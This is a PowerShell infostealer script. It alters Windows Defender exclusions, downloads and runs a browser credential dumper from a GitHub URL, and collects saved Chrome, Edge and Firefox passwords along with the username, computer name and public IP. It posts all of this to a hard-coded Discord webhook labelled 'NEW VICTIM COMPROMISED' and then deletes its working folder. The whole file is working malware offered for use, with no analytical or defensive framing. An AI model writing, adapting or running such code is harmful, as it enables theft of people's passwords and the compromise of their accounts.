# Add Windows Defender exclusion
#Add-MpPreference -ExclusionPath "$env:appdata"
Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue

# Create working directory
mkdir "$env:appdata\Microsoft\dump" -Force
Set-Location "$env:appdata\Microsoft\dump"

# Download and run HackBrowser
Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item "hb.exe" -Force

# Get victim info
$ip = (Invoke-RestMethod "http://ifconfig.me/ip").Trim()
$username = $env:USERNAME
$computer = $env:COMPUTERNAME

# Discord webhook
$webhook = "https://discord.com/api/webhooks/1480287085771620606/WtlPfAW2q0H_-PmPD8AG6axb7k_iHbzmkg46kiomUxskavkfn7yCXoKaP_VtssBE0mJ9"

# Read stolen credentials from JSON files
$allCreds = @()

# Check for Chrome passwords
if (Test-Path "chrome_passwords.json") {
    $chromeCreds = Get-Content "chrome_passwords.json" | ConvertFrom-Json
    foreach ($cred in $chromeCreds) {
        $allCreds += "🔵 **Chrome** | $($cred.url)`n   User: ``$($cred.username)```n   Pass: ``$($cred.password)```n"
    }
}

# Check for Edge passwords
if (Test-Path "edge_passwords.json") {
    $edgeCreds = Get-Content "edge_passwords.json" | ConvertFrom-Json
    foreach ($cred in $edgeCreds) {
        $allCreds += "🔷 **Edge** | $($cred.url)`n   User: ``$($cred.username)```n   Pass: ``$($cred.password)```n"
    }
}

# Check for Firefox passwords
if (Test-Path "firefox_passwords.json") {
    $firefoxCreds = Get-Content "firefox_passwords.json" | ConvertFrom-Json
    foreach ($cred in $firefoxCreds) {
        $allCreds += "🦊 **Firefox** | $($cred.url)`n   User: ``$($cred.username)```n   Pass: ``$($cred.password)```n"
    }
}

# If no credentials found
if ($allCreds.Count -eq 0) {
    $allCreds += "⚠️ No saved passwords found in browsers"
}

# Combine all credentials
$credsText = $allCreds -join "`n"

# Discord message with credentials as text
$payload = @{
    content = "🎯 **NEW VICTIM COMPROMISED**"
    embeds = @(
        @{
            title = "💻 System Information"
            color = 15158332  # Red
            fields = @(
                @{
                    name = "👤 User"
                    value = $username
                    inline = $true
                }
                @{
                    name = "🖥️ Computer"
                    value = $computer
                    inline = $true
                }
                @{
                    name = "🌐 IP Address"
                    value = $ip
                    inline = $false
                }
            )
        },
        @{
            title = "🔑 Stolen Credentials"
            description = $credsText
            color = 16776960  # Yellow
        }
    )
} | ConvertTo-Json -Depth 10

# Send to Discord
Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json; charset=utf-8'

# Cleanup
cd "$env:appdata"
Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue
